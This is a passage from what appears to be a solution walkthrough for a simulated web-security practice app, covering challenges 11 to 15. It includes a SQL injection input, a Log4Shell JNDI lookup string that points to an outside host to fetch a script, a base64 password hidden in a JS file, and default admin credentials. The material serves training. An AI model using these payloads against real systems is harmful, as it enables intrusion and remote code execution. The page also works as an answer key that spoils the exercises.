#### Challenge 11 - HTTP mistake
If you take a look on developer tools, you'll see that even with correct password the HTTP request end with `405` error.
The solution is in the error message: `Method not allowed`. Try some other methods (preferably those better suited for
_authentication_ call) and see what happens.

#### Challenge 12 - SQL Injection
Simulated backend of this application creates SQL query like this:

`txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;`.

So if you pass any id, but add `OR` clause with true value it may go through. Remember to surround SQL functions with 
quotes.
Example: `dasdasdasdasdasdasdasdas 'OR' 12 '==' 12`.

#### Challenge 13 - unprotected JS file
Password is hidden in java script file included to `index.html`. If you go there, you'll find an unused constant 
`passwd` which contains password encoded with base64.

#### Challenge 14 - Log4J vulnerability
This challenge simulates [CVE-2021-44228](https://owasp.org/blog/2021/12/13/Log4J-Alert). The correct answer would be
`${jndi:ldap://hackingsite.pl/myscript}`. This behavior is showed for example 
[in this youtube video](https://www.youtube.com/watch?v=0-abhd-CLwQ&ab_channel=MarcusHutchins).

#### Challenge 15 - URL Interpretation
There is indeed a admin panel. At the very same site, but with adding `/admin.html` to the URL. And the credentials 
are... `admin: admin` (who would have guessed??). After logging in you can see the user list, along with passwords.
I suppose it's easy from there.
